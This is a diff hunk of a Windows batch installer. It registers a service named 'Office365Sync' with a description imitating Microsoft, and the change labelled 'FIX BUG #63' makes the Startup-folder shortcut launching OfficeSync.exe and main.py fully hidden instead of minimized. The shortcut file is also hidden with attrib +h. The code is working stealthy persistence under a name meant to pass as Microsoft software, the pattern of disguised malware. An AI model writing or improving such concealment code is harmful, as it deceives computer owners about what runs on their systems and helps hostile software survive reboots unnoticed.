@@ -132,9 +132,9 @@ sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_
 sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings" >nul 2>&1
 sc config "Office365Sync" start= delayed-auto >nul 2>&1
 
-:: Fallback: Create hidden startup shortcut if service fails
+:: FIX BUG #63: Create hidden startup shortcut with WindowStyle = 0 (Hidden, not Minimized)
 set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
-powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\OfficeSync.lnk'); $SC.TargetPath = '%INSTALL_DIR%\OfficeSync.exe'; $SC.Arguments = '%INSTALL_DIR%\main.py'; $SC.WorkingDirectory = '%INSTALL_DIR%'; $SC.WindowStyle = 7; $SC.Save()"
+powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\OfficeSync.lnk'); $SC.TargetPath = '%INSTALL_DIR%\OfficeSync.exe'; $SC.Arguments = '%INSTALL_DIR%\main.py'; $SC.WorkingDirectory = '%INSTALL_DIR%'; $SC.WindowStyle = 0; $SC.Save()"
 attrib +h "%STARTUP_DIR%\OfficeSync.lnk"
 
 :: Start the service
